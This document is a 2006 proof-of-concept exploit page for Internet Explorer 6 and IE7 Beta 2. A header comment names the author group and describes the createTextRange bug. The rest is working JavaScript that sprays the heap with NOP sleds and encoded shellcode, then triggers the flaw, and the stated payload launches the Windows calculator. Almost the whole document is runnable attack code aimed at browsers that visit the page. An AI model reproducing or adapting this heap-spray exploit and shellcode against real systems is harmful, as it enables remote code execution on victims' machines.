&lt;!--
 -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
/\
\/	Internet Explorer Remote Code Execution Exploit v 0.1
/\		  by Darkeagle of Unl0ck Research Team
\/
/\	used SkyLined idea of exploitation. special tnx goes to him.
\/

Affected Software	:  Microsoft Internet Explorer 6.x, IE7 Beta 2
Severity		:  Critical
Impact		:  Remote System Access
Solution Status	:  ** UNPATCHED **
Discovered by 	:  Computer Terrorism (UK)
Advisory Date	:  22nd March, 2006
Tested		:  WinXP SP2 RUS IE 6.0 (full patched)

Vulnerability details:

PoC from CyberTerrorists crashes IE and overwrites EIP. EIP points to unknown place.
In my case it points to 0x3c0474c2.
Exploit fills heap with "nops+shellcode" 'til 0x3CxxXXxx. Then IE trys to read memory
@ 0x3c0474c2. At this time 0x3c0474c2 contains nops+shellcode. In the end IE executes
shellcode.

Exploit needs more RAM.
Tested under 192mb RAM with 800mb of maximum page cache.

Under 512mb code was executed after 1-1.5 minutes.

Successfull exploitation will execute standart windows calculator.

Greets: 
		Unl0ck Researchers,
		0x557 guys,
		ph4nt0m guys,
		sh0k, uf0,
		BlackSecurity guys,
		many otherz.

/\	http://unl0ck.net
\/	
/\	(c) 2004 - 2006
\/
 -_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
--&gt;
&lt;pre&gt;
&lt;input type="checkbox" id="blah"&gt;
&lt;SCRIPT language="javascript"&gt;

shellcode = unescape(	"%u9090%u9090%u9090%uC929%uE983%uD9DB%uD9EE%u2474" +
			"%u5BF4%u7381%uA913%u4A67%u83CC%uFCEB%uF4E2%u8F55" +
			"%uCC0C%u67A9%u89C1%uEC95%uC936%u66D1%u47A5%u7FE6" +
			"%u93C1%u6689%u2FA1%u2E87%uF8C1%u6622%uFDA4%uFE69" +
			"%u48E6%u1369%u0D4D%u6A63%u0E4B%u9342%u9871%u638D" +
			"%u2F3F%u3822%uCD6E%u0142%uC0C1%uECE2%uD015%u8CA8" +
			"%uD0C1%u6622%u45A1%u43F5%u0F4E%uA798%u472E%u57E9" +
			"%u0CCF%u68D1%u8CC1%uECA5%uD03A%uEC04%uC422%u6C40" +
			"%uCC4A%uECA9%uF80A%u1BAC%uCC4A%uECA9%uF022%u56F6" +
			"%uACBC%u8CFF%uA447%uBFD7%uBFA8%uFFC1%u46B4%u30A7" +
			"%u2BB5%u8941%u33B5%u0456%uA02B%u49CA%uB42F%u67CC" +
			"%uCC4A%uD0FF");

    bigblock = unescape("%u9090%u9090"); 
    slackspace = 20 + shellcode.length

    while (bigblock.length &lt; slackspace)
		bigblock += bigblock;

    fillblock = bigblock.substring(0, slackspace);

    block = bigblock.substring(0, bigblock.length-slackspace);

    while(block.length + slackspace &lt; 0x40000) 
		block = block + block + fillblock;

    memory = new Array();

    for ( i = 0; i &lt; 2020; i++ ) 
		memory[i] = block + shellcode;
  
    var r = document.getElementById('blah').createTextRange();

&lt;/script&gt;
&lt;/pre&gt;